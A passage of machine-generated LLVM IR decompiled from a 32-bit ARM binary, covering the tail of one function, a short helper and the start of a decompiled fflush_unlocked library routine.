  %v0_184c8 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_184c8, label %dec_label_pc_184cc, label %dec_label_pc_184b8.dec_label_pc_184ac_crit_edge

dec_label_pc_184b8.dec_label_pc_184ac_crit_edge:  ; preds = %dec_label_pc_184b8
  %v0_184ac.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_184b0.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_184ac = inttoptr i32 %v0_184ac.pre to i32*
  %v2_184ac = load i32, i32* %v1_184ac, align 4
  store i32 %v2_184ac, i32* %r3.global-to-local, align 4
  %v3_184b0 = icmp uge i32 %v2_184ac, %v1_184b0.pre
  store i1 %v3_184b0, i1* %cpsr_c.global-to-local, align 1
  %v9_184b0 = icmp eq i32 %v2_184ac, %v1_184b0.pre
  br i1 %v9_184b0, label %dec_label_pc_184b8, label %dec_label_pc_184d0

dec_label_pc_184cc:                               ; preds = %dec_label_pc_184b8
  %v0_184cc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_184cc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_184d0

dec_label_pc_184d0:                               ; preds = %dec_label_pc_184a4, %dec_label_pc_184b8.dec_label_pc_184ac_crit_edge, %dec_label_pc_184cc
  %v0_184d0 = phi i32 [ %v0_184cc, %dec_label_pc_184cc ], [ %v2_184ac87, %dec_label_pc_184a4 ], [ %v2_184ac, %dec_label_pc_184b8.dec_label_pc_184ac_crit_edge ]
  %v1_184d0 = phi i32 [ %v0_184cc, %dec_label_pc_184cc ], [ 0, %dec_label_pc_184a4 ], [ %v1_184b0.pre, %dec_label_pc_184b8.dec_label_pc_184ac_crit_edge ]
  %v3_184d0 = icmp uge i32 %v0_184d0, %v1_184d0
  store i1 %v3_184d0, i1* %cpsr_c.global-to-local, align 1
  %v9_184d0 = icmp eq i32 %v0_184d0, %v1_184d0
  br i1 %v9_184d0, label %bb48, label %bb47

bb47:                                             ; preds = %dec_label_pc_184d0
  %v1_184d4 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_184d4, i32* %r0.global-to-local, align 4
  br label %bb48

bb48:                                             ; preds = %dec_label_pc_184d0, %bb47
  %v1_184d8 = xor i1 %v9_184d0, true
  call void @__pseudo_cond_branch(i1 %v1_184d8, i32 ptrtoint (i32* @global_var_15ff0.919 to i32))
  %v0_184dc = load i32, i32* %r6.global-to-local, align 4
  %v1_184dc = load i32, i32* %r7.global-to-local, align 4
  %v2_184dc = add i32 %v1_184dc, 8
  %v3_184dc = inttoptr i32 %v2_184dc to i32*
  store i32 %v0_184dc, i32* %v3_184dc, align 4
  %v0_184e8.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_184e0

dec_label_pc_184e0:                               ; preds = %dec_label_pc_18490, %bb48
  %v0_184e8 = phi i32 [ %v0_18480, %dec_label_pc_18490 ], [ %v0_184e8.pre, %bb48 ]
  store i32 152, i32* %r3.global-to-local, align 4
  store i32 76, i32* %r1.global-to-local, align 4
  %v2_184e8 = add i32 %v0_184e8, 152
  %v3_184e8 = inttoptr i32 %v2_184e8 to i32*
  %v4_184e8 = load i32, i32* %v3_184e8, align 4
  store i32 %v4_184e8, i32* %r0.global-to-local, align 4
  %v2_184ec = add i32 %v0_184e8, 76
  %v3_184ec = inttoptr i32 %v2_184ec to i32*
  %v4_184ec = load i32, i32* %v3_184ec, align 4
  store i32 %v4_184ec, i32* %r2.global-to-local, align 4
  %v1_184f0 = add i32 %v4_184e8, 4
  %v2_184f0 = inttoptr i32 %v1_184f0 to i32*
  %v3_184f0 = load i32, i32* %v2_184f0, align 4
  store i32 %v3_184f0, i32* %r3.global-to-local, align 4
  %v1_184f4 = inttoptr i32 %v4_184ec to i32*
  %v2_184f4 = load i32, i32* %v1_184f4, align 4
  store i32 %v2_184f4, i32* %r2.global-to-local, align 4
  %v1_184f8 = add i32 %v3_184f0, 1
  store i32 %v1_184f8, i32* %r3.global-to-local, align 4
  store i32 76, i32* %r7.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 %v1_184f8, i32* %v2_184f0, align 4
  %v0_18548.pr = load i32, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1854811 = icmp eq i32 %v0_18548.pr, 0
  store i32 32816, i32* %r1.global-to-local, align 4
  br i1 %v2_1854811, label %dec_label_pc_18554, label %dec_label_pc_1850c

dec_label_pc_1850c:                               ; preds = %dec_label_pc_184e0, %dec_label_pc_18544
  %v0_185302 = phi i32 [ %v0_18544, %dec_label_pc_18544 ], [ %v0_18548.pr, %dec_label_pc_184e0 ]
  %v1_1850c = inttoptr i32 %v0_185302 to i16*
  %v2_1850c = load i16, i16* %v1_1850c, align 2
  %v3_1850c = zext i16 %v2_1850c to i32
  store i32 %v3_1850c, i32* %r3.global-to-local, align 4
  %v2_18510 = and i32 %v3_1850c, 32816
  store i32 %v2_18510, i32* %r1.global-to-local, align 4
  %v2_18514 = icmp ugt i32 %v2_18510, 47
  store i1 %v2_18514, i1* %cpsr_c.global-to-local, align 1
  %v7_18514 = icmp eq i32 %v2_18510, 48
  %v1_18518 = add i32 %v0_185302, 32
  %v2_18518 = inttoptr i32 %v1_18518 to i32*
  %v3_18518 = load i32, i32* %v2_18518, align 4
  store i32 %v3_18518, i32* %r4.global-to-local, align 4
  br i1 %v7_18514, label %dec_label_pc_18524, label %.thread38

.thread38:                                        ; preds = %dec_label_pc_1850c
  store i32 %v0_185302, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_18544

dec_label_pc_18524:                               ; preds = %dec_label_pc_1850c
  %v0_18524 = load i32, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_18524 = icmp eq i32 %v0_18524, 0
  br i1 %v2_18524, label %.thread, label %bb49

.thread:                                          ; preds = %dec_label_pc_18524
  %v1_18528 = load i32, i32* %r5.global-to-local, align 4
  %v2_18528 = load i32, i32* %r7.global-to-local, align 4
  %v3_18528 = add i32 %v2_18528, %v1_18528
  %v4_18528 = inttoptr i32 %v3_18528 to i32*
  %v5_18528 = load i32, i32* %v4_18528, align 4
  store i32 %v5_18528, i32* %r3.global-to-local, align 4
  %v3_1852c = inttoptr i32 %v5_18528 to i32*
  store i32 %v3_18518, i32* %v3_1852c, align 4
  %v0_18530 = load i32, i32* %r2.global-to-local, align 4
  %v1_18530 = inttoptr i32 %v0_18530 to i16*
  %v2_18530 = load i16, i16* %v1_18530, align 2
  %v3_18530 = zext i16 %v2_18530 to i32
  store i32 %v3_18530, i32* %r3.global-to-local, align 4
  br label %bb50

bb49:                                             ; preds = %dec_label_pc_18524
  %v2_185308 = load i16, i16* %v1_1850c, align 2
  %v3_185309 = zext i16 %v2_185308 to i32
  store i32 %v3_185309, i32* %r3.global-to-local, align 4
  %v3_18534 = add i32 %v0_18524, 32
  %v4_18534 = inttoptr i32 %v3_18534 to i32*
  store i32 %v3_18518, i32* %v4_18534, align 4
  %v0_18538.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb50

bb50:                                             ; preds = %.thread, %bb49
  %v0_18538 = phi i32 [ %v3_18530, %.thread ], [ %v0_18538.pre, %bb49 ]
  %v1_18538 = and i32 %v0_18538, 8192
  %v2_18538 = icmp eq i32 %v1_18538, 0
  br i1 %v2_18538, label %bb52, label %bb51

bb51:                                             ; preds = %bb50
  %v1_1853c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_1853c, i32* %r0.global-to-local, align 4
  br label %bb52

bb52:                                             ; preds = %bb50, %bb51
  %v1_18540 = xor i1 %v2_18538, true
  call void @__pseudo_cond_branch(i1 %v1_18540, i32 ptrtoint (i32* @global_var_1504c.63 to i32))
  %v0_18544.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_18544

dec_label_pc_18544:                               ; preds = %.thread38, %bb52
  %v0_18544 = phi i32 [ %v0_18544.pre, %bb52 ], [ %v3_18518, %.thread38 ]
  store i32 %v0_18544, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_18548 = icmp eq i32 %v0_18544, 0
  store i32 32816, i32* %r1.global-to-local, align 4
  br i1 %v2_18548, label %dec_label_pc_18554, label %dec_label_pc_1850c

dec_label_pc_18554:                               ; preds = %dec_label_pc_18544, %dec_label_pc_184e0
  store i32 152, i32* %r3.global-to-local, align 4
  %v0_18558 = load i32, i32* %r5.global-to-local, align 4
  %v2_18558 = add i32 %v0_18558, 152
  %v3_18558 = inttoptr i32 %v2_18558 to i32*
  %v4_18558 = load i32, i32* %v3_18558, align 4
  store i32 %v4_18558, i32* %r0.global-to-local, align 4
  %v1_1855c = add i32 %v4_18558, 4
  %v2_1855c = inttoptr i32 %v1_1855c to i32*
  %v3_1855c = load i32, i32* %v2_1855c, align 4
  %v1_18560 = add i32 %v3_1855c, -1
  store i32 %v1_18560, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_18564 = icmp eq i32 %v1_18560, 0
  store i32 %v1_18560, i32* %v2_1855c, align 4
  br i1 %v2_18564, label %dec_label_pc_18570, label %dec_label_pc_185d0

dec_label_pc_18570:                               ; preds = %dec_label_pc_18554
  %v0_18570 = load i32, i32* %r3.global-to-local, align 4
  %v1_18570 = load i32, i32* %r0.global-to-local, align 4
  %v2_18570 = add i32 %v1_18570, 8
  %v3_18570 = inttoptr i32 %v2_18570 to i32*
  store i32 %v0_18570, i32* %v3_18570, align 4
  %v0_18574 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_18574, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_18578

dec_label_pc_18578:                               ; preds = %dec_label_pc_185a8.dec_label_pc_18578_crit_edge, %dec_label_pc_18570
  %v0_18578 = phi i32 [ %v0_18578.pre, %dec_label_pc_185a8.dec_label_pc_18578_crit_edge ], [ %v0_18574, %dec_label_pc_18570 ]
  %v1_18578 = inttoptr i32 %v0_18578 to i32*
  %v2_18578 = load i32, i32* %v1_18578, align 4
  store i32 %v2_18578, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_18578, i32* %r2.global-to-local, align 4
  %v2_1858474 = load i32, i32* %v1_18578, align 4
  store i32 %v2_1858474, i32* %r3.global-to-local, align 4
  %v3_1858876 = icmp uge i32 %v2_1858474, %v2_18578
  store i1 %v3_1858876, i1* %cpsr_c.global-to-local, align 1
  %v9_1858882 = icmp eq i32 %v2_1858474, %v2_18578
  br i1 %v9_1858882, label %dec_label_pc_18590, label %dec_label_pc_185a8

dec_label_pc_18590:                               ; preds = %dec_label_pc_18578, %dec_label_pc_18590.dec_label_pc_18584_crit_edge
  %v0_1859083 = phi i32 [ %v1_18588.pre, %dec_label_pc_18590.dec_label_pc_18584_crit_edge ], [ %v2_18578, %dec_label_pc_18578 ]
  store i32 %v0_1859083, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_185a0 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_185a0, label %dec_label_pc_185a4, label %dec_label_pc_18590.dec_label_pc_18584_crit_edge

dec_label_pc_18590.dec_label_pc_18584_crit_edge:  ; preds = %dec_label_pc_18590
  %v0_18584.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_18588.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_18584 = inttoptr i32 %v0_18584.pre to i32*
  %v2_18584 = load i32, i32* %v1_18584, align 4
  store i32 %v2_18584, i32* %r3.global-to-local, align 4
  %v3_18588 = icmp uge i32 %v2_18584, %v1_18588.pre
  store i1 %v3_18588, i1* %cpsr_c.global-to-local, align 1
  %v9_18588 = icmp eq i32 %v2_18584, %v1_18588.pre
  br i1 %v9_18588, label %dec_label_pc_18590, label %dec_label_pc_185a8

dec_label_pc_185a4:                               ; preds = %dec_label_pc_18590
  %v0_185a4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_185a4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_185a8

dec_label_pc_185a8:                               ; preds = %dec_label_pc_18578, %dec_label_pc_18590.dec_label_pc_18584_crit_edge, %dec_label_pc_185a4
  %v0_185b0 = phi i32 [ %v0_185a4, %dec_label_pc_185a4 ], [ %v2_1858474, %dec_label_pc_18578 ], [ %v2_18584, %dec_label_pc_18590.dec_label_pc_18584_crit_edge ]
  %v1_185a8 = phi i32 [ %v0_185a4, %dec_label_pc_185a4 ], [ %v2_18578, %dec_label_pc_18578 ], [ %v1_18588.pre, %dec_label_pc_18590.dec_label_pc_18584_crit_edge ]
  %v3_185a8 = icmp uge i32 %v0_185b0, %v1_185a8
  store i1 %v3_185a8, i1* %cpsr_c.global-to-local, align 1
  %v9_185a8 = icmp eq i32 %v0_185b0, %v1_185a8
  br i1 %v9_185a8, label %dec_label_pc_185b0, label %dec_label_pc_185a8.dec_label_pc_18578_crit_edge

dec_label_pc_185a8.dec_label_pc_18578_crit_edge:  ; preds = %dec_label_pc_185a8
  %v0_18578.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_18578

dec_label_pc_185b0:                               ; preds = %dec_label_pc_185a8
  %v2_185b0 = icmp ne i32 %v1_185a8, 0
  store i1 %v2_185b0, i1* %cpsr_c.global-to-local, align 1
  %v7_185b4 = icmp slt i32 %v1_185a8, 2
  br i1 %v7_185b4, label %dec_label_pc_185d0, label %dec_label_pc_185b8

dec_label_pc_185b8:                               ; preds = %dec_label_pc_185b0
  %v0_185b8 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_185b8, i32* %r0.global-to-local, align 4
  %v0_185bc = load i32, i32* %r1.global-to-local, align 4
  %v1_185bc = add i32 %v0_185bc, 129
  store i32 %v1_185bc, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_185d0

dec_label_pc_185d0:                               ; preds = %dec_label_pc_18554, %dec_label_pc_185b8, %dec_label_pc_185b0
  store i32 80, i32* %r3.global-to-local, align 4
  %v0_185d4 = load i32, i32* %r5.global-to-local, align 4
  %v2_185d4 = add i32 %v0_185d4, 80
  %v3_185d4 = inttoptr i32 %v2_185d4 to i32*
  %v4_185d4 = load i32, i32* %v3_185d4, align 4
  store i32 %v4_185d4, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_185dc = inttoptr i32 %v4_185d4 to i32*
  store i32 0, i32* %v2_185dc, align 4
  br label %dec_label_pc_185e0

dec_label_pc_185e0:                               ; preds = %dec_label_pc_18454, %dec_label_pc_1847c, %dec_label_pc_185d0
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_185e4 = load i32, i32* %r5.global-to-local, align 4
  %v2_185e4 = add i32 %v0_185e4, 160
  %v3_185e4 = inttoptr i32 %v2_185e4 to i32*
  %v4_185e4 = load i32, i32* %v3_185e4, align 4
  store i32 %v4_185e4, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_185ec = add i32 %v0_185e4, 12
  %v3_185ec = inttoptr i32 %v2_185ec to i32*
  %v4_185ec = load i32, i32* %v3_185ec, align 4
  store i32 %v4_185ec, i32* %r1.global-to-local, align 4
  %v1_185f0 = add i32 %v4_185e4, 4
  %v2_185f0 = inttoptr i32 %v1_185f0 to i32*
  %v3_185f0 = load i32, i32* %v2_185f0, align 4
  store i32 %v3_185f0, i32* %r2.global-to-local, align 4
  %v1_185f4 = inttoptr i32 %v4_185ec to i32*
  %v2_185f4 = load i32, i32* %v1_185f4, align 4
  %v1_185f8 = add i32 %v3_185f0, -1
  store i32 %v1_185f8, i32* %r2.global-to-local, align 4
  %v1_185fc = add i32 %v2_185f4, -1
  store i32 %v1_185fc, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_18600 = icmp eq i32 %v1_185f8, 0
  store i32 %v1_185fc, i32* %v1_185f4, align 4
  %v0_18608 = load i32, i32* %r2.global-to-local, align 4
  %v1_18608 = load i32, i32* %r0.global-to-local, align 4
  %v2_18608 = add i32 %v1_18608, 4
  %v3_18608 = inttoptr i32 %v2_18608 to i32*
  store i32 %v0_18608, i32* %v3_18608, align 4
  br i1 %v2_18600, label %dec_label_pc_18610, label %dec_label_pc_18670

dec_label_pc_18610:                               ; preds = %dec_label_pc_185e0
  %v0_18610 = load i32, i32* %r2.global-to-local, align 4
  %v1_18610 = load i32, i32* %r0.global-to-local, align 4
  %v2_18610 = add i32 %v1_18610, 8
  %v3_18610 = inttoptr i32 %v2_18610 to i32*
  store i32 %v0_18610, i32* %v3_18610, align 4
  %v0_18614 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_18614, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_18618

dec_label_pc_18618:                               ; preds = %dec_label_pc_18648.dec_label_pc_18618_crit_edge, %dec_label_pc_18610
  %v0_18618 = phi i32 [ %v0_18618.pre, %dec_label_pc_18648.dec_label_pc_18618_crit_edge ], [ %v0_18614, %dec_label_pc_18610 ]
  %v1_18618 = inttoptr i32 %v0_18618 to i32*
  %v2_18618 = load i32, i32* %v1_18618, align 4
  store i32 %v2_18618, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_18618, i32* %r2.global-to-local, align 4
  %v2_1862462 = load i32, i32* %v1_18618, align 4
  store i32 %v2_1862462, i32* %r3.global-to-local, align 4
  %v3_1862864 = icmp uge i32 %v2_1862462, %v2_18618
  store i1 %v3_1862864, i1* %cpsr_c.global-to-local, align 1
  %v9_1862870 = icmp eq i32 %v2_1862462, %v2_18618
  br i1 %v9_1862870, label %dec_label_pc_18630, label %dec_label_pc_18648

dec_label_pc_18630:                               ; preds = %dec_label_pc_18618, %dec_label_pc_18630.dec_label_pc_18624_crit_edge
  %v0_1863071 = phi i32 [ %v1_18628.pre, %dec_label_pc_18630.dec_label_pc_18624_crit_edge ], [ %v2_18618, %dec_label_pc_18618 ]
  store i32 %v0_1863071, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_18640 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_18640, label %dec_label_pc_18644, label %dec_label_pc_18630.dec_label_pc_18624_crit_edge

dec_label_pc_18630.dec_label_pc_18624_crit_edge:  ; preds = %dec_label_pc_18630
  %v0_18624.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_18628.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_18624 = inttoptr i32 %v0_18624.pre to i32*
  %v2_18624 = load i32, i32* %v1_18624, align 4
  store i32 %v2_18624, i32* %r3.global-to-local, align 4
  %v3_18628 = icmp uge i32 %v2_18624, %v1_18628.pre
  store i1 %v3_18628, i1* %cpsr_c.global-to-local, align 1
  %v9_18628 = icmp eq i32 %v2_18624, %v1_18628.pre
  br i1 %v9_18628, label %dec_label_pc_18630, label %dec_label_pc_18648

dec_label_pc_18644:                               ; preds = %dec_label_pc_18630
  %v0_18644 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_18644, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_18648

dec_label_pc_18648:                               ; preds = %dec_label_pc_18618, %dec_label_pc_18630.dec_label_pc_18624_crit_edge, %dec_label_pc_18644
  %v0_18650 = phi i32 [ %v0_18644, %dec_label_pc_18644 ], [ %v2_1862462, %dec_label_pc_18618 ], [ %v2_18624, %dec_label_pc_18630.dec_label_pc_18624_crit_edge ]
  %v1_18648 = phi i32 [ %v0_18644, %dec_label_pc_18644 ], [ %v2_18618, %dec_label_pc_18618 ], [ %v1_18628.pre, %dec_label_pc_18630.dec_label_pc_18624_crit_edge ]
  %v3_18648 = icmp uge i32 %v0_18650, %v1_18648
  store i1 %v3_18648, i1* %cpsr_c.global-to-local, align 1
  %v9_18648 = icmp eq i32 %v0_18650, %v1_18648
  br i1 %v9_18648, label %dec_label_pc_18650, label %dec_label_pc_18648.dec_label_pc_18618_crit_edge

dec_label_pc_18648.dec_label_pc_18618_crit_edge:  ; preds = %dec_label_pc_18648
  %v0_18618.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_18618

dec_label_pc_18650:                               ; preds = %dec_label_pc_18648
  %v2_18650 = icmp ne i32 %v1_18648, 0
  store i1 %v2_18650, i1* %cpsr_c.global-to-local, align 1
  %v7_18654 = icmp slt i32 %v1_18648, 2
  br i1 %v7_18654, label %dec_label_pc_18670, label %dec_label_pc_18658

dec_label_pc_18658:                               ; preds = %dec_label_pc_18650
  %v0_18658 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_18658, i32* %r0.global-to-local, align 4
  %v0_1865c = load i32, i32* %r1.global-to-local, align 4
  %v1_1865c = add i32 %v0_1865c, 129
  store i32 %v1_1865c, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_18670

dec_label_pc_18670:                               ; preds = %dec_label_pc_185e0, %dec_label_pc_18658, %dec_label_pc_18650
  %v2_18674 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_18674, i32* %r4.global-to-local, align 4
  %v1_18678 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_18678

; uselistorder directives
  uselistorder i32 %v0_18644, { 1, 0, 2 }
  uselistorder i32 %v1_18628.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_18618, { 1, 0 }
  uselistorder i32 %v0_185a4, { 1, 0, 2 }
  uselistorder i32 %v1_18588.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_18578, { 1, 0 }
  uselistorder i32 %v0_18544, { 2, 1, 0 }
  uselistorder i32 %v0_184e8, { 1, 0 }
  uselistorder i32 %v0_184cc, { 1, 0, 2 }
  uselistorder i32 %v1_184b0.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_1849c, { 1, 0 }
  uselistorder i32 %v0_18440, { 1, 0, 2 }
  uselistorder i32 %v1_18424.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v4_183f8, { 2, 1, 0, 3 }
  uselistorder i32* %r7.global-to-local, { 0, 1, 2, 3, 4, 6, 5, 7, 8, 9, 11, 10, 12, 14, 13, 15 }
  uselistorder i32* %r6.global-to-local, { 5, 6, 0, 1, 2, 3, 4 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 4, 0, 5, 6, 7 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 13, 12, 14 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 3, 2, 41, 4, 5, 6, 7, 8, 9, 10, 12, 11, 42, 13, 14, 15, 39, 40, 16, 17, 18, 19, 20, 21, 22, 24, 23, 43, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 36, 35, 44, 37, 38 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 12, 9, 10, 11 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 2, 20, 21, 3, 4, 5, 6, 22, 23, 7, 10, 8, 9, 19, 11, 12, 24, 25, 13, 14, 15, 16, 17, 26, 27, 18 }
  uselistorder i32 8192, { 3, 0, 1, 2 }
  uselistorder i32 47, { 5, 1, 13, 6, 7, 8, 2, 9, 0, 10, 11, 3, 12, 4 }
  uselistorder i32 32816, { 2, 0, 1 }
  uselistorder label %dec_label_pc_18670, { 1, 2, 0 }
  uselistorder label %dec_label_pc_18648, { 2, 1, 0 }
  uselistorder label %dec_label_pc_18630, { 1, 0 }
  uselistorder label %dec_label_pc_185e0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_185d0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_185a8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_18590, { 1, 0 }
  uselistorder label %dec_label_pc_18544, { 1, 0 }
  uselistorder label %bb52, { 1, 0 }
  uselistorder label %bb50, { 1, 0 }
  uselistorder label %dec_label_pc_1850c, { 1, 0 }
  uselistorder label %dec_label_pc_184e0, { 1, 0 }
  uselistorder label %bb48, { 1, 0 }
  uselistorder label %dec_label_pc_184d0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_184b8, { 1, 0 }
  uselistorder label %dec_label_pc_18454, { 1, 0 }
  uselistorder label %bb45, { 1, 0 }
  uselistorder label %dec_label_pc_18444, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1842c, { 1, 0 }
}

define i32 @function_18680(i32 %arg1) local_unnamed_addr {
dec_label_pc_18680:
  %v0_18680 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_18680, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_18680
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_18680, %bb
  %v10_18694 = phi i32 [ %arg1, %dec_label_pc_18680 ], [ 0, %bb ]
  ret i32 %v10_18694

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @fflush_unlocked(i16* %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v6_18698 = load i32, i32* @r5, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24424.765 to i32), i32* @r6, align 4
  %v4_186a8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24424.765 to i32), i32 76) to i32*), align 4
  store i32 %v4_186a8, i32* %r3.global-to-local, align 4
  %v4_186ac = icmp uge i32 %tmp, %v4_186a8
  store i1 %v4_186ac, i1* %cpsr_c.global-to-local, align 1
  %v10_186ac = icmp eq i32 %tmp, %v4_186a8
  br i1 %v10_186ac, label %bb, label %dec_label_pc_186c4

bb:                                               ; preds = %entry
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %tmp, i32* @r4, align 4
  br label %dec_label_pc_186d4

dec_label_pc_186c4:                               ; preds = %entry
  store i32 %tmp, i32* @r4, align 4
  store i32 256, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v3_186c8 = icmp eq i16* %arg1, null
  br i1 %v3_186c8, label %dec_label_pc_186d4, label %dec_label_pc_189e8

dec_label_pc_186d4:                               ; preds = %bb, %dec_label_pc_186c4
  %stack_var_-44.1 = phi i32 [ 0, %bb ], [ 256, %dec_label_pc_186c4 ]
  store i32 160, i32* %r3.global-to-local, align 4
  %v4_186d8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24424.765 to i32), i32 160) to i32*), align 4
  store i32 %v4_186d8, i32* %r5.global-to-local, align 4
  %v0_186dc = call i32 @__aeabi_read_tp()
  store i32 %v0_186dc, i32* %r0.global-to-local, align 4
  %v1_186e0 = add i32 %v4_186d8, 8
  %v2_186e0 = inttoptr i32 %v1_186e0 to i32*
  %v3_186e0 = load i32, i32* %v2_186e0, align 4
  store i32 %v3_186e0, i32* %r3.global-to-local, align 4
  %v1_186e4 = add i32 %v0_186dc, -1168
  store i32 %v1_186e4, i32* %r8.global-to-local, align 4
  %v3_186e8 = icmp uge i32 %v3_186e0, %v1_186e4
  store i1 %v3_186e8, i1* %cpsr_c.global-to-local, align 1
  %v9_186e8 = icmp eq i32 %v3_186e0, %v1_186e4
  br i1 %v9_186e8, label %dec_label_pc_18730, label %dec_label_pc_186f0

dec_label_pc_186f0:                               ; preds = %dec_label_pc_186d4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_186d8, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_186fc143 = inttoptr i32 %v4_186d8 to i32*
  %v2_186fc144 = load i32, i32* %v1_186fc143, align 4
  store i32 %v2_186fc144, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_18700146 = icmp eq i32 %v2_186fc144, 0
  br i1 %v9_18700146, label %dec_label_pc_18708, label %dec_label_pc_18720

dec_label_pc_18708:                               ; preds = %dec_label_pc_186f0, %dec_label_pc_18708.dec_label_pc_186fc_crit_edge
  %v0_18708147 = phi i32 [ %v1_18700.pre, %dec_label_pc_18708.dec_label_pc_186fc_crit_edge ], [ 0, %dec_label_pc_186f0 ]
  store i32 %v0_18708147, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_18718 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_18718, label %dec_label_pc_1871c, label %dec_label_pc_18708.dec_label_pc_186fc_crit_edge

dec_label_pc_18708.dec_label_pc_186fc_crit_edge:  ; preds = %dec_label_pc_18708
  %v0_186fc.pre = load i32, i32* %r2.global-to-local, align 4
